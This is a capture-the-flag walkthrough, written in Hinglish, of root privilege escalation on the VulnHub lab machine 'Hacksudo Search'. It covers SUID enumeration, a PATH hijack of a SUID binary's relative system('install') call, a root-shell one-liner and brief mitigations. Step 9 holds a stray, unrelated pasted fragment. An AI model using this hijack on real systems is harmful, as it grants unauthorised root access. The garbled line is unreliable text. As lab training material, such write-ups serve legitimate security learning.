# Hacksudo-Search-CTF
Hacksudo: Search CTF — Technical Walkthrough
# Hacksudo Search — Privilege Escalation (SUID + PATH Hijack)

## Target
- Machine: Hacksudo Search (VulnHub)
- Attacker: robot (Kali)
- Victim IP: 192.168.1.11
- Initial User: hacksudo
- Goal: root

---

## Step 1 — SSH Login as hacksudo

```bash
ssh hacksudo@192.168.1.11
# password: (jo aapne pehle find kiya tha)
```

---

## Step 2 — Enumeration: SUID binaries check karo

```bash
find / -perm -4000 -type f 2>/dev/null
```

Output me milega:
```
/home/hacksudo/search/tools/searchinstall
```

---

## Step 3 — Target directory me jao aur permissions dekho

```bash
cd ~/search/tools
ls -la
```

Output:
```
---Sr-xr-x 1 root     root     16712 Apr 14  2021 searchinstall
-rw-r--r-- 1 hacksudo hacksudo    78 Apr 14  2021 searchinstall.c
-rw-r--r-- 1 hacksudo hacksudo     0 Apr 15  2021 file
```

✅ `S` in owner slot = **SUID root** binary
✅ Owned by `root` = privilege escalation possible

---

## Step 4 — Source code padho (vulnerability samjho)

```bash
cat searchinstall.c
```

Output:
```c
#include<unistd.h>
void main()
{
    setuid(0);
    setgid(0);
    system("install");   // ← VULNERABLE: relative command, PATH se resolve hota hai
}
```

**Vulnerability:** `system("install")` command ko **absolute path** ke bina call kar raha hai. Matlab shell `$PATH` me `install` dhundhega. Agar hum apna fake `install` bana ke `/tmp` ko PATH me sabse aage daal dein → humara script **root** ke roop me chalega.

---

## Step 5 — Malicious `install` script banao

```bash
cat > /tmp/install <<'EOF'
#!/bin/bash
/bin/bash -p
EOF
```

Explanation:
- `#!/bin/bash` → shebang, script bash me chalegi
- `/bin/bash -p` → `-p` flag bash ko bolta hai **privileged mode** me chalo (euid drop mat karo). SUID binary me ye zaroori hai warna bash root privileges drop kar dega.

---

## Step 6 — Script ko executable banao

```bash
chmod +x /tmp/install
```

---

## Step 7 — PATH hijack karo

```bash
export PATH=/tmp:$PATH
```

Explanation: `/tmp` ko PATH me **sabse pehle** daal diya. Ab jab bhi `install` command dhundhi jayegi, system pehle `/tmp/install` check karega.

---

## Step 8 — Verify karo ki hijack sahi hua

```bash
which install
```

Expected output:
```
/tmp/install
```

Agar `/usr/bin/install` ya kuch aur aaye → PATH sahi set nahi hua, Step 7 dobara karo.

---

## Step 9 — SUID binary run karo

```bash
cd ~/search/tools
./searchinstall
```

Ab aap **root shell** me ho! Prompt change ho jayega (`Beware, uBlock Origin blocked a potential ClickFix attack:  se `#` ho sakta hai).

---

## Step 10 — Root verify karo

```bash
whoami
id
```

Expected:
```
root
uid=0(root) gid=0(root) groups=0(root)
```

---

## Step 11 — Root flag read karo

```bash
cat /root/root.txt
```

✅ **Exploit complete!**

---

## ⚡ One-Liner (paste all at once)

```bash
printf '#!/bin/bash\n/bin/bash -p\n' > /tmp/install && chmod +x /tmp/install && export PATH=/tmp:$PATH && cd ~/search/tools && ./searchinstall
```

---

## 🧠 Why This Works (Summary)

| Step | Kya hua |
|------|---------|
| `searchinstall` SUID root hai | Run karne pe root ke roop me chalta hai |
| `setuid(0); setgid(0);` | Andar se bhi root privileges set karta hai |
| `system("install")` | Command ko PATH se dhundhta hai, absolute path nahi |
| Humne `/tmp/install` banaya | Fake `install` jo root shell dega |
| `export PATH=/tmp:$PATH` | `/tmp` pehle check hoga |
| `./searchinstall` run kiya | Binary ne `/tmp/install` ko root ke roop me execute kiya |
| `/bin/bash -p` | Root privileges preserve kiye, shell mil gaya |

---

## 🛡️ Mitigation (Defensive Side)

1. **Absolute path use karo:** `system("/usr/bin/install")` ya `execve()` directly
2. **PATH environment sanitize karo** SUID binaries me
3. **SUID bit hata do** agar zaroorat nahi hai: `chmod u-s searchinstall`
4. **Least privilege principle** follow karo

---

## 📌 Commands Summary (Copy-Paste Ready)

```bash
# 1. Login
ssh hacksudo@192.168.1.11

# 2. Enumerate SUID
find / -perm -4000 -type f 2>/dev/null

# 3. Check target
cd ~/search/tools && ls -la

# 4. Read source
cat searchinstall.c

# 5. Create malicious install
printf '#!/bin/bash\n/bin/bash -p\n' > /tmp/install
chmod +x /tmp/install

# 6. Hijack PATH
export PATH=/tmp:$PATH

# 7. Verify
which install    # → /tmp/install

# 8. Exploit
cd ~/search/tools && ./searchinstall

# 9. Verify root
whoami && id

# 10. Root flag
cat /root/root.txt
```

<img width="1920" height="1080" alt="Screenshot_2026-09-21_21_53_12" src="https://github.com/user-attachments/assets/980d6a80-c6d8-4122-8b47-d9c294a4a81f" />
<img width="1920" height="1080" alt="Screenshot_2026-09-21_22_03_06" src="https://github.com/user-attachments/assets/f39886d2-aacb-4752-8509-207eae5e3e38" />
<img width="1920" height="1080" alt="Screenshot_2026-09-21_22_05_43" src="https://github.com/user-attachments/assets/e9426253-4931-464e-9ccb-4a0d533dcb8c" />
<img width="1920" height="1080" alt="Screenshot_2026-09-21_22_09_45" src="https://github.com/user-attachments/assets/dd92bf8a-84d9-4772-b5a7-a08c6ca9022b" />
<img width="1920" height="1080" alt="Screenshot_2026-09-21_22_10_01" src="https://github.com/user-attachments/assets/9c944975-1d61-4e85-b2cd-bedb16e84ec9" />
<img width="1920" height="1080" alt="Screenshot_2026-09-21_22_13_45" src="https://github.com/user-attachments/assets/efe92120-dc4d-4c36-9adf-48b517564290" />
<img width="1920" height="1080" alt="Screenshot_2026-09-21_22_15_06" src="https://github.com/user-attachments/assets/2cdbf902-ef09-4c10-9a87-6b27427911f0" />
<img width="1920" height="1080" alt="Screenshot_2026-09-21_22_16_33" src="https://github.com/user-attachments/assets/b04c7835-4bc4-4a42-95dd-ea7de6a7cab4" />
<img width="1920" height="1080" alt="Screenshot_2026-09-21_22_22_16" src="https://github.com/user-attachments/assets/7c24bf3c-3f1c-418e-9ace-dbee92ee8176" />
<img width="1920" height="1080" alt="Screenshot_2026-09-22_11_51_54" src="https://github.com/user-attachments/assets/4e7bb795-37b3-48c2-af47-e9d73f0f03f6" />
<img width="1920" height="1080" alt="Screenshot_2026-09-22_11_51_47" src="https://github.com/user-attachments/assets/7b68354d-fd09-4968-80a7-d7f584d0d34e" />

